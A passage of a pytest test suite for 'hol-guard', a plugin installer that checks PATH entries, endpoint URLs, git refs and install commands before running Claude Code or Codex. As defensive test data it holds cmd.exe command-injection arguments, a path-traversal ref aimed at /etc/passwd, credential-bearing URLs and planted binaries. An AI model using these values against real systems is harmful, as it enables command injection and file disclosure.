    assert runtimes.ran == []


def _program(folder: Path, name: str, mode: int = 0o755) -> Path:
    folder.mkdir(parents=True, exist_ok=True)
    path = folder / name
    path.write_text("#!/bin/sh\n", encoding="utf-8")
    path.chmod(mode)
    return path


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
def test_programs_come_only_from_absolute_folders_nobody_else_can_write(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    planted = _program(tmp_path / "work", "claude")
    shared = tmp_path / "shared"
    _program(shared, "claude")
    shared.chmod(0o777)
    loose = _program(tmp_path / "loose", "codex", 0o777)
    real = _program(tmp_path / "real", "claude")
    real_codex = _program(tmp_path / "real", "codex")
    monkeypatch.chdir(tmp_path / "work")
    lookup = runner.find_programs(("claude", "codex"), {"PATH": f".:{shared}:{loose.parent}:{tmp_path / 'real'}"})
    assert lookup.programs["claude"].path == str(real)
    assert lookup.programs["codex"].path == str(real_codex)
    assert lookup.ignored == [
        f"Guard ignored {planted}: it is in a relative PATH entry.",
        f"Guard ignored {shared / 'claude'}: it is in a folder every user can write to.",
        f"Guard ignored {loose}: every user can write to it.",
    ]
    shared.chmod(0o755)


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
def test_programs_under_a_folder_anyone_can_change_are_ignored(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    open_root = tmp_path / "open"
    nested = _program(open_root / "tools" / "bin", "claude")
    sticky_root = tmp_path / "sticky"
    sticky = _program(sticky_root / "bin", "claude")
    linked_folder = tmp_path / "linked"
    linked_folder.mkdir()
    (linked_folder / "codex").symlink_to(_program(open_root / "real", "codex"))
    open_root.chmod(0o777)
    sticky_root.chmod(0o1777)
    try:
        lookup = runner.find_programs(("claude", "codex"), {"PATH": f"{nested.parent}:{linked_folder}:{sticky.parent}"})
        assert lookup.programs["claude"].path == str(sticky)
        assert "codex" not in lookup.programs
        assert lookup.ignored == [
            f"Guard ignored {nested}: every user can change {open_root}.",
            f"Guard ignored {linked_folder / 'codex'}: every user can change {open_root}.",
        ]
    finally:
        open_root.chmod(0o755)
        sticky_root.chmod(0o755)

    # The program is there when the folder is searched and gone a moment later.
    real_stat = os.stat
    calls: list[str] = []

    def vanishing(target: object, *args: object, **kwargs: object) -> os.stat_result:
        if str(target) == str(sticky):
            calls.append(str(target))
            if len(calls) > 1:
                raise FileNotFoundError(target)
        return real_stat(target, *args, **kwargs)  # type: ignore[arg-type]

    monkeypatch.setattr(runner.os, "stat", vanishing)
    assert runner.find_programs(("claude",), {"PATH": str(sticky.parent)}).programs == {}


def test_windows_prefers_an_exe_ignores_the_current_folder_and_guards_shim_arguments(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    _program(tmp_path / "work", "claude.cmd")
    npm = tmp_path / "npm"
    _program(npm, "claude.cmd")
    _program(npm, "claude.exe")
    _program(npm, "codex.cmd")
    monkeypatch.chdir(tmp_path / "work")
    lookup = runner.find_programs(("claude", "codex"), {"PATH": f".;{npm}"}, windows=True)
    claude, codex = lookup.programs["claude"], lookup.programs["codex"]
    assert (claude.path, claude.batch) == (str(npm / "claude.exe"), False)
    assert (codex.path, codex.batch) == (str(npm / "codex.cmd"), True)
    assert lookup.ignored == [f"Guard ignored {tmp_path / 'work' / 'claude.cmd'}: it is in a relative PATH entry."]
    runner.check_arguments(codex, ["plugin", "add", "toolgate@acme", "--ref", SCANNED])
    runner.check_arguments(claude, ["name with space"])
    for argument in ("a&b", "%PATH%", "a^b", "a|b", '"x"', "(x)", "x!", "a b", "a\tb", "", "a\x1bb"):
        with pytest.raises(runner.RunnerError, match=r"cmd\.exe could read it as a command"):
            runner.check_arguments(codex, ["plugin", "add", argument])


@pytest.mark.skipif(os.name == "nt", reason="POSIX permission bits")
def test_runtimes_installed_outside_path_are_found_and_the_plan_says_so(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    home = tmp_path / "home"
    claude = _program(home / ".local" / "bin", "claude")
    codex = _program(tmp_path / "npm-prefix" / "bin", "codex")
    _program(home / ".bun" / "bin", "codex")
    environ = {"HOME": str(home), "NPM_CONFIG_PREFIX": str(tmp_path / "npm-prefix"), "PATH": str(tmp_path / "empty")}
    known = install.known_locations(environ, windows=False)
    assert known[:4] == [
        str(home / ".local" / "bin"),
        str(home / ".claude" / "local"),
        str(home / ".bun" / "bin"),
        str(home / ".npm-global" / "bin"),
    ]
    assert str(tmp_path / "npm-prefix" / "bin") in known
    # A world-writable install folder is skipped the same way a PATH folder is.
    (home / ".bun" / "bin").chmod(0o777)
    lookup = runner.find_programs(("claude", "codex"), environ, windows=False, known=known)
    (home / ".bun" / "bin").chmod(0o755)
    assert lookup.programs["claude"].path == str(claude)
    assert lookup.programs["codex"].path == str(codex)
    assert not lookup.programs["claude"].on_path
    # PATH still wins over a known folder.
    on_path = _program(tmp_path / "onpath", "claude")
    lookup = runner.find_programs(("claude",), {"PATH": str(on_path.parent)}, windows=False, known=known)
    assert (lookup.programs["claude"].path, lookup.programs["claude"].on_path) == (str(on_path), True)

    monkeypatch.setattr(install, "known_locations", lambda environ=None: known)
    monkeypatch.setenv("PATH", str(tmp_path / "empty"))
    plan = {
        "action": "install",
        "slug": "acme/toolgate",
        "steps": [{"runtime": "claude-code", "program": "claude", "automatic": True, "commands": [["claude"]]}],
    }
    out = io.StringIO()
    install.write_plan(plan, install.find_programs(), apply=False, out=out)
    row = next(line for line in out.getvalue().splitlines() if line.lstrip().startswith("Claude Code"))
    assert str(claude) in row
    assert row.endswith("(not on PATH)")


def test_windows_looks_in_the_npm_folder_under_appdata(tmp_path: Path) -> None:
    environ = {"USERPROFILE": str(tmp_path / "me"), "APPDATA": str(tmp_path / "roaming")}
    known = install.known_locations(environ, windows=True)
    assert str(tmp_path / "roaming" / "npm") in known
    assert "/opt/homebrew/bin" not in known


def test_git_head_follows_symbolic_and_packed_refs(tmp_path: Path) -> None:
    git = tmp_path / "repo" / ".git"
    git.mkdir(parents=True)
    (git / "HEAD").write_text("ref: refs/heads/main\n", encoding="utf-8")
    (git / "packed-refs").write_text(f"# pack-refs\n{SCANNED} refs/heads/main\n", encoding="utf-8")
    assert install.git_head(tmp_path / "repo") == SCANNED
    (git / "refs" / "heads").mkdir(parents=True)
    (git / "refs" / "heads" / "main").write_text(f"{OTHER}\n", encoding="utf-8")
    assert install.git_head(tmp_path / "repo") == OTHER
    (git / "HEAD").write_text("ref: refs/../../../etc/passwd\n", encoding="utf-8")
    assert install.git_head(tmp_path / "repo") is None
    assert install.git_head(tmp_path / "missing") is None
    (git / "HEAD").write_bytes(b"ref: refs/heads/\xff\n")
    assert install.git_head(tmp_path / "repo") is None


def test_telemetry_marks_only_listings_guard_installed(guard_home: Path) -> None:
    install.record(guard_home, "acme/toolgate", "codex", installed=True, spec=SPEC)
    report = {
        "entries": [
            {"slug": "acme/toolgate", "runtime": "codex", "version": None, "key": "a" * 64},
            {"slug": "acme/toolgate", "runtime": "claude-code", "version": None, "key": "b" * 64},
            {"slug": "other/plugin", "runtime": "codex", "version": None, "key": "c" * 64},
        ]
    }
    marked = install.mark_guard_installs(report, guard_home)["entries"]
    assert [entry.get("via") for entry in marked] == ["hol-guard", None, None]
    assert "via" not in report["entries"][0]


@pytest.fixture
def local_portal() -> Iterator[tuple[str, list[str]]]:
    """A loopback install-spec endpoint serving SPEC with its listing on the same origin."""

    requests: list[str] = []
    holder: dict[str, str] = {}

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            requests.append(self.path)
            if self.path.startswith("/moved"):
                self.send_response(302)
                self.send_header("Location", f"{holder['origin']}api/guard/plugins/install-spec")
                self.send_header("Content-Length", "0")
                self.end_headers()
                return
            listing = f"{holder['origin']}registry/plugins/acme%2Ftoolgate"
            body = json.dumps(
                {**SPEC, "listingUrl": listing, "security": {**SPEC["security"], "reportUrl": listing}}
            ).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *_args: object) -> None:
            return

    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    holder["origin"] = f"http://127.0.0.1:{server.server_address[1]}/"
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield f"{holder['origin']}api/guard/plugins/install-spec", requests
    finally:
        server.shutdown()
        server.server_close()


def test_the_spec_endpoint_override_reaches_a_local_portal_and_says_so(
    local_portal: tuple[str, list[str]], runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
) -> None:
    endpoint, requests = local_portal
    monkeypatch.setenv(install.SPEC_URL_ENV, endpoint)
    exit_code, output, error = _run(["plugin", "install", "acme/toolgate", "--apply", "--yes", "--runtime", "codex"])
    assert exit_code == 0, error
    assert requests == ["/api/guard/plugins/install-spec?slug=acme%2Ftoolgate&schema=2"]
    assert f"Warning: {install.SPEC_URL_ENV} is set. Install details come from {endpoint}, not hol.org." in error
    origin = endpoint.removesuffix("api/guard/plugins/install-spec")
    assert f"Listing   {origin}registry/plugins/acme%2Ftoolgate" in output
    assert ["codex", "plugin", "add", "toolgate@acme"] in runtimes.ran

    # The record kept the local listing, and uninstall plans from it through the same override.
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    assert ["codex", "plugin", "remove", "toolgate@acme"] in runtimes.ran


def test_a_hol_org_listing_is_refused_once_the_endpoint_is_overridden(
    local_portal: tuple[str, list[str]], spec_file: Path, runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
) -> None:
    # The listing check follows the override instead of also accepting hol.org,
    # so a fixture endpoint cannot vouch for a listing it does not serve.
    monkeypatch.setenv(install.SPEC_URL_ENV, local_portal[0])
    exit_code, _output, error = _run(
        ["plugin", "install", "acme/toolgate", "--spec-file", str(spec_file), "--apply", "--yes"]
    )
    assert (exit_code, runtimes.ran) == (4, [])
    assert "failed Guard's checks" in error


def test_an_overridden_endpoint_does_not_follow_redirects(
    local_portal: tuple[str, list[str]], runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
) -> None:
    endpoint, requests = local_portal
    moved = endpoint.replace("api/guard/plugins/install-spec", "moved")
    monkeypatch.setenv(install.SPEC_URL_ENV, moved)
    exit_code, _output, error = _run(["plugin", "install", "acme/toolgate", "--apply", "--yes", "--runtime", "codex"])
    assert (exit_code, runtimes.ran, requests) == (2, [], ["/moved?slug=acme%2Ftoolgate&schema=2"])
    assert f"{install.SPEC_URL_ENV} answered with a redirect" in error


def test_uninstall_through_another_endpoint_names_the_mismatch(
    local_portal: tuple[str, list[str]], runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
) -> None:
    endpoint, _requests = local_portal
    monkeypatch.setenv(install.SPEC_URL_ENV, endpoint)
    exit_code, _output, error = _run(["plugin", "install", "acme/toolgate", "--apply", "--yes", "--runtime", "codex"])
    assert exit_code == 0, error
    monkeypatch.delenv(install.SPEC_URL_ENV)
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 2
    assert "recorded this listing through a different install-spec URL" in error
    assert "could not be read" not in error


@pytest.mark.parametrize(
    "value",
    [
        "http://registry.example/api/guard/plugins/install-spec",
        "http://10.0.0.5:3000/api/guard/plugins/install-spec",
        "ftp://127.0.0.1/spec",
        "https://user:pass@registry.example/spec",
        "https://registry.example/spec?slug=other",
        "https://registry.example/spec#x",
        "https://registry.example/spec#",
        "https://@registry.example/spec",
        "https://registry.example:/spec",
        "http://localhost:0/spec",
        "https://my_portal.example/spec",
        "http://127.0.0.1:99999/spec",
        "http://[bad/spec",
        "not a url",
    ],
)
def test_an_unsafe_spec_endpoint_override_is_refused_before_any_request(
    value: str, runtimes: FakeRuntimes, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv(install.SPEC_URL_ENV, value)
    monkeypatch.setattr(install, "managed_urlopen", lambda *_a, **_k: pytest.fail("no request expected"))
    exit_code, output, error = _run(["plugin", "install", "acme/toolgate", "--apply", "--yes"])
    assert (exit_code, output, runtimes.ran) == (2, "", [])
    assert f"{install.SPEC_URL_ENV} must be an https URL" in error


@pytest.mark.parametrize(
    ("value", "origin"),
    [
        ("https://staging.example/api/guard/plugins/install-spec", "https://staging.example/"),
        ("http://localhost:3000/api/guard/plugins/install-spec", "http://localhost:3000/"),
        ("http://[::1]:3000/spec", "http://[::1]:3000/"),
        ("https://Staging.Example:443/spec", "https://staging.example/"),
        ("http://host.docker.internal:3000/spec", "http://host.docker.internal:3000/"),
        ("", None),
    ],
)
def test_allowed_spec_endpoint_overrides_and_their_listing_origin(value: str, origin: str | None) -> None:
    endpoint, listing_origin = install.spec_endpoint({install.SPEC_URL_ENV: value})
    assert listing_origin == origin
    assert endpoint == (value or install.SPEC_URL)


def test_uninstall_keeps_a_marketplace_guard_did_not_add_or_another_plugin_uses(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    # Claude Code already had the marketplace; Codex gets it from Guard.
    known = runtimes.claude_home / "plugins" / "known_marketplaces.json"
    known.parent.mkdir(parents=True)
    known.write_text(json.dumps({"acme": {"source": {"source": "github", "repo": "acme/toolgate"}}}), encoding="utf-8")
    exit_code, _output, error = _install(spec_file, "--apply", "--yes")
    assert exit_code == 0, error
    assert ["claude", "plugin", "marketplace", "add", "acme/toolgate"] not in runtimes.ran
    runtimes.codex_plugins.add("other@acme")
    runtimes.ran.clear()

    exit_code, output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    assert runtimes.ran == [
        ["claude", "plugin", "uninstall", "toolgate@acme"],
        ["codex", "plugin", "list", "--json"],
        ["codex", "plugin", "remove", "toolgate@acme"],
        ["codex", "plugin", "list", "--json"],
    ]
    assert "Kept the acme marketplace Guard added; other plugins still use it: other@acme." in output
    assert install.recorded_installs(guard_home) == {}


def test_a_runtime_that_reports_success_but_does_not_list_the_plugin_fails(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.codex_lists_nothing = True
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 1
    assert "codex finished, but it does not list toolgate@acme. Check with: codex plugin list" in error
    assert "Guard removed the marketplace it added." in error
    assert runtimes.ran[-1] == ["codex", "plugin", "marketplace", "remove", "acme"]
    assert install.recorded_installs(guard_home) == {}


def test_a_plugin_list_guard_cannot_read_after_install_keeps_the_marketplace(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    runtimes.exit_codes[("codex", "plugin", "list")] = 1
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "codex")
    assert exit_code == 1
    assert "Guard could not read its plugin list to check toolgate@acme." in error
    assert "Guard kept the marketplace it added, because the plugin may be installed." in error
    assert ["codex", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran
    assert runtimes.ran[-1] == ["codex", "plugin", "list", "--json"]


def test_a_plugin_list_guard_cannot_read_is_never_taken_as_empty(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    record = runtimes.claude_home / "plugins" / "installed_plugins.json"
    record.parent.mkdir(parents=True)
    record.write_text("{not json", encoding="utf-8")
    exit_code, _output, error = _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")
    assert (exit_code, runtimes.ran) == (1, [])
    assert "Guard could not read Claude Code's plugin record" in error

    # Installed while the record was readable, then it broke: uninstall still
    # runs Claude Code's own removal instead of assuming it is gone.
    record.unlink()
    assert _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")[0] == 0
    record.write_text("{not json", encoding="utf-8")
    runtimes.ran.clear()
    runtimes.exit_codes[("claude", "plugin", "uninstall")] = 0
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 1
    assert runtimes.ran == [["claude", "plugin", "uninstall", "toolgate@acme"]]
    assert "could not read its plugin list" in error
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}


def test_uninstall_keeps_a_marketplace_a_project_plugin_uses_or_that_points_elsewhere(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    assert _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")[0] == 0
    installed = runtimes._state("installed_plugins.json")
    installed["plugins"]["other@acme"] = [{"scope": "project", "projectPath": "/work/app"}]
    runtimes._save("installed_plugins.json", installed)
    exit_code, output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    assert "other plugins still use it: other@acme." in output
    assert ["claude", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran

    runtimes._save("installed_plugins.json", {"version": 2, "plugins": {}})
    runtimes._save("known_marketplaces.json", {})
    assert _install(spec_file, "--apply", "--yes", "--runtime", "claude-code")[0] == 0
    # The user pointed the marketplace name at another repository since.
    runtimes._save("known_marketplaces.json", {"acme": {"source": {"source": "github", "repo": "mallory/acme"}}})
    runtimes.ran.clear()
    exit_code, output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    assert "Kept the acme marketplace: it now comes from mallory/acme" in output
    assert ["claude", "plugin", "marketplace", "remove", "acme"] not in runtimes.ran


def test_a_marketplace_guard_could_not_remove_stays_in_its_record(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    assert _install(spec_file, "--apply", "--yes", "--runtime", "codex")[0] == 0
    runtimes.exit_codes[("codex", "plugin", "marketplace", "remove")] = 1
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 1
    assert "Guard could not remove the acme marketplace it added." in error
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["codex"]}

    # The next uninstall finds the plugin gone and retries the marketplace.
    del runtimes.exit_codes[("codex", "plugin", "marketplace", "remove")]
    runtimes.ran.clear()
    exit_code, _output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    assert runtimes.ran[-1] == ["codex", "plugin", "marketplace", "remove", "acme"]
    assert install.recorded_installs(guard_home) == {}


def test_runtime_output_past_the_limit_is_cut_off(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(runner, "OUTPUT_LIMIT_BYTES", 1024)
    program = runner.Program("python", sys.executable)
    loud = runner.run(program, ["-c", "print('x' * 512)"], capture=True)
    assert loud.stdout == "x" * 512 + "\n"
    with pytest.raises(runner.RunnerError, match="printed more than"):
        runner.run(program, ["-c", "import sys; sys.stdout.write('x' * 4096)"], capture=True)


@pytest.mark.skipif(sys.platform == "win32", reason="relies on a POSIX child inheriting the stdout pipe")
def test_a_background_process_holding_the_pipe_does_not_hold_up_the_command(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr(runner, "READER_GRACE_SECONDS", 0.5)
    program = runner.Program("python", sys.executable)
    script = (
        "import subprocess, sys;"
        "child = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(30)']);"
        "print(child.pid, flush=True)"
    )
    started = time.monotonic()
    completed = runner.run(program, ["-c", script], capture=True)
    elapsed = time.monotonic() - started
    held = int(completed.stdout.split()[0])
    with contextlib.suppress(OSError):
        os.kill(held, 9)
    assert completed.returncode == 0
    assert elapsed < 10


def _http_error(code: int, retry_after: str | None = None) -> urllib.error.HTTPError:
    headers = email.message.Message()
    if retry_after is not None:
        headers["Retry-After"] = retry_after
    return urllib.error.HTTPError(install.SPEC_URL, code, "error", headers, None)


@pytest.mark.parametrize(
    ("error", "message", "attempts"),
    [
        (urllib.error.URLError(socket.gaierror(8, "nodename nor servname")), "Guard could not look up hol.org", 1),
        (urllib.error.URLError(TimeoutError("timed out")), "did not answer within 10 seconds, twice", 2),
        (urllib.error.URLError(ConnectionRefusedError(61, "refused")), "hol.org refused the connection", 1),
        (
            urllib.error.URLError(ssl.SSLCertVerificationError("CERTIFICATE_VERIFY_FAILED")),
            "set SSL_CERT_FILE",
            1,
        ),
        (urllib.error.URLError(OSError("Tunnel connection failed: 403 Forbidden")), "Your proxy", 1),
        (urllib.error.URLError(OSError(51, "Network is unreachable")), "appears to be offline", 1),
        (_http_error(403), "HTTP 403", 1),
        (_http_error(429, "42"), "Try again in 42 seconds", 1),
        (_http_error(503), "HTTP 503", 2),
    ],
)
def test_each_network_failure_says_what_failed_and_exits_6(
    monkeypatch: pytest.MonkeyPatch, error: BaseException, message: str, attempts: int
) -> None:
    calls: list[object] = []

    def fail(*_args: object, **_kwargs: object) -> None:
        calls.append(1)
        raise error

    monkeypatch.setattr(install, "managed_urlopen", fail)
    monkeypatch.setattr(install, "_SPEC_RETRY_SECONDS", 0)
    monkeypatch.delenv("HTTPS_PROXY", raising=False)
    monkeypatch.delenv("https_proxy", raising=False)
    with pytest.raises(install.PluginInstallError) as raised:
        install.fetch_spec("acme/toolgate")
    assert raised.value.exit_code == install.EXIT_UNREACHABLE
    assert message in str(raised.value)
    assert len(calls) == attempts


def test_a_proxy_is_named_without_its_credentials(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("HTTPS_PROXY", "http://user:secret@proxy.example:3128")
    monkeypatch.setattr(
        install,
        "managed_urlopen",
        lambda *_a, **_k: (_ for _ in ()).throw(urllib.error.URLError(ConnectionRefusedError(61, "refused"))),
    )
    with pytest.raises(install.PluginInstallError) as raised:
        install.fetch_spec("acme/toolgate")
    assert "Your proxy proxy.example:3128 refused the connection" in str(raised.value)
    assert "secret" not in str(raised.value) and "user" not in str(raised.value)


def test_a_slow_answer_prints_one_progress_line_and_a_fast_one_prints_none(monkeypatch: pytest.MonkeyPatch) -> None:
    class Response(io.BytesIO):
        def __enter__(self) -> Response:
            return self

        def __exit__(self, *_exc: object) -> None:
            return None

    delay = {"seconds": 0.3}

    def answer(*_args: object, **_kwargs: object) -> Response:
        time.sleep(delay["seconds"])
        return Response(json.dumps(SPEC).encode())

    monkeypatch.setattr(install, "managed_urlopen", answer)
    monkeypatch.setattr(install, "_PROGRESS_AFTER_SECONDS", 0.05)
    shown = io.StringIO()
    assert install.fetch_spec("acme/toolgate", progress=shown)["slug"] == "acme/toolgate"
    assert shown.getvalue() == "Getting install details for acme/toolgate from hol.org...\n"
    delay["seconds"] = 0
    monkeypatch.setattr(install, "_PROGRESS_AFTER_SECONDS", 0.2)
    quiet = io.StringIO()
    install.fetch_spec("acme/toolgate", progress=quiet)
    time.sleep(0.3)
    assert quiet.getvalue() == ""


def test_reinstalling_says_already_installed_and_changes_nothing(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    assert _install(spec_file, "--apply", "--yes")[0] == 0
    runtimes.ran.clear()
    runtimes.codex_already = True
    exit_code, output, error = _install(spec_file, "--apply", "--yes")
    assert exit_code == 0, error
    assert f"claude-code: already installed at commit {SCANNED[:7]}." in output
    assert f"codex: already installed at commit {SCANNED[:7]}." in output
    # Codex is asked where its marketplace is and what it lists; nothing is added.
    assert runtimes.ran == [
        ["codex", "plugin", "marketplace", "add", "acme/toolgate", "--ref", SCANNED, "--json"],
        ["codex", "plugin", "list", "--json"],
    ]
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code", "codex"]}
    # Guard still owns the marketplaces it added the first time.
    runtimes.ran.clear()
    _output = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])[1]
    assert _output.count("Removed the acme marketplace Guard added.") == 2


def test_uninstall_after_a_manual_removal_brings_the_record_up_to_date(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    assert _install(spec_file, "--apply", "--yes")[0] == 0
    installed = runtimes.claude_home / "plugins" / "installed_plugins.json"
    installed.write_text(json.dumps({"version": 2, "plugins": {}}), encoding="utf-8")
    runtimes.codex_plugins.clear()
    runtimes.ran.clear()
    exit_code, output, error = _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert exit_code == 0, error
    assert ["claude", "plugin", "uninstall", "toolgate@acme"] not in runtimes.ran
    assert ["codex", "plugin", "remove", "toolgate@acme"] not in runtimes.ran
    assert "claude-code: already removed; Guard updated its record. Removed the acme marketplace" in output
    assert install.recorded_installs(guard_home) == {}


def test_a_partial_failure_names_the_retry_command(spec_file: Path, runtimes: FakeRuntimes, guard_home: Path) -> None:
    runtimes.exit_codes[("codex", "plugin", "add")] = 3
    exit_code, output, error = _install(spec_file, "--apply", "--yes")
    assert exit_code == 1
    assert "claude-code: installed" in output
    retry = ["hol-guard", "plugin", "install", "acme/toolgate", "--apply", "--runtime", "codex"]
    retry += ["--spec-file", str(spec_file), "--yes"]
    assert f"Retry codex with: {shlex.join(retry)}" in error
    # Codex added the marketplace for this install, so Guard takes it back.
    assert runtimes.ran[-1] == ["codex", "plugin", "marketplace", "remove", "acme"]
    assert install.recorded_installs(guard_home) == {"acme/toolgate": ["claude-code"]}
    exit_code, output, _error = _install(spec_file, "--apply", "--yes", "--json")
    assert json.loads(output)["retry"] == [*retry, "--json"]


def test_one_tip_after_the_first_install_only_on_a_terminal(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    exit_code, output, _error = _install(spec_file, "--apply", "--yes", "--json")
    assert exit_code == 0
    assert "Tip:" not in output
    _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    assert _install(spec_file, "--apply", "--yes")[1].count("Tip:") == 0

    from codex_plugin_scanner.guard.plugin_kit import cli as kit_cli

    monkeypatch.setattr(kit_cli, "_stdout_is_terminal", lambda: True)
    _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    output = _install(spec_file, "--apply", "--yes")[1]
    assert output.count("Tip:") == 1
    assert "Guard does not check what runs in Claude Code and Codex yet." in output
    assert "To turn that on: hol-guard install claude-code codex" in output
    # Not the first install any more: no tip.
    assert "Tip:" not in _install(spec_file, "--apply", "--yes", "--runtime", "codex")[1]

    _run(["plugin", "uninstall", "acme/toolgate", "--apply", "--yes"])
    database = sqlite3.connect(guard_home / "guard.db")
    database.execute("create table managed_installs (harness text, active integer)")
    database.executemany("insert into managed_installs values (?, 1)", [("claude-code",), ("codex",)])
    database.commit()
    database.close()
    output = _install(spec_file, "--apply", "--yes")[1]
    assert "Tip: hol-guard plugin uninstall acme/toolgate shows how to remove it again." in output


def test_help_lists_plugin_and_each_command_has_examples(monkeypatch: pytest.MonkeyPatch) -> None:
    from codex_plugin_scanner.guard.cli import commands_parser_constants

    assert "  plugin       Install a HOL plugin listing" in commands_parser_constants._GUARD_HELP_GROUPS
    # The program name selects the Guard command set, as it does for the installed script.
    monkeypatch.setattr(guard_cli.sys, "argv", ["hol-guard"])
    monkeypatch.setenv("COLUMNS", "80")
    output = io.StringIO()
    with contextlib.redirect_stdout(output), pytest.raises(SystemExit):
        guard_cli.main(["plugin", "install", "--help"])
    text = output.getvalue()
    assert "hol-guard plugin install acme/toolgate --apply" in text
    assert "130  interrupted" in text
    assert max(len(line) for line in text.splitlines()) <= 80


@pytest.mark.parametrize(
    ("ran", "swapped", "reason"),
    [
        ("node other.js", None, "ran a different install command than the one Guard showed"),
        ("node setup.js", "e" * 40, f"at commit eeeeeee, not the commit HOL scanned ({SCANNED[:7]})"),
    ],
)
def test_a_declared_command_install_is_removed_when_it_is_not_what_guard_showed(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path, ran: str, swapped: str | None, reason: str
) -> None:
    runtimes.declared = DECLARED
    runtimes.declared_ran = ran
    runtimes.head_after_install = swapped
    exit_code, _output, error = _install(
        spec_file, "--apply", "--yes", "--runtime", "claude-code", "--accept-command", DECLARED
    )
    assert exit_code == 4
    assert reason in error
    assert "Guard removed it again." in error
    assert ["claude", "plugin", "uninstall", "toolgate@acme"] in runtimes.ran
    assert runtimes.ran[-1] == ["claude", "plugin", "marketplace", "remove", "acme"]
    assert install.recorded_installs(guard_home) == {}


def test_a_declared_command_never_runs_from_a_checkout_that_is_not_the_scanned_commit(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    """Running the command is not undoable, so the checkout that declares it is
    held against the scanned commit before it runs, not only afterwards."""

    runtimes.declared = DECLARED
    runtimes.claude_marketplace_head = "e" * 40
    exit_code, _output, error = _install(
        spec_file, "--apply", "--yes", "--runtime", "claude-code", "--accept-command", DECLARED
    )
    assert exit_code == 4
    assert f"checkout is at commit eeeeeee, not the commit HOL scanned ({SCANNED[:7]})" in error
    assert "did not let the install command run" in error
    assert not any("--accept-command" in argv for argv in runtimes.ran)
    assert runtimes.ran[-1] == ["claude", "plugin", "marketplace", "remove", "acme"]
    assert install.recorded_installs(guard_home) == {}


def test_a_plugin_installed_by_a_command_from_another_commit_is_not_called_already_installed(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
    """A record left by a declared command carries no commit of its own, so the
    checkout it came from is what a repeat install has to check."""

    runtimes.declared = DECLARED
    base = ("--apply", "--yes", "--runtime", "claude-code", "--accept-command", DECLARED)
    exit_code, _output, error = _install(spec_file, *base)
    assert exit_code == 0, error

    (runtimes.claude_marketplace / ".git" / "HEAD").write_text("e" * 40 + "\n", encoding="utf-8")
    before = len(runtimes.ran)
    exit_code, _output, error = _install(spec_file, *base)
    assert exit_code == 4
    assert f"at commit eeeeeee, not the commit HOL scanned ({SCANNED[:7]})" in error
    assert "claude plugin uninstall toolgate@acme" in error
    assert not any(argv[:2] == ["claude", "plugin"] for argv in runtimes.ran[before:])


def test_a_plugin_installed_by_another_command_is_not_called_already_installed(
    spec_file: Path, runtimes: FakeRuntimes, guard_home: Path
) -> None:
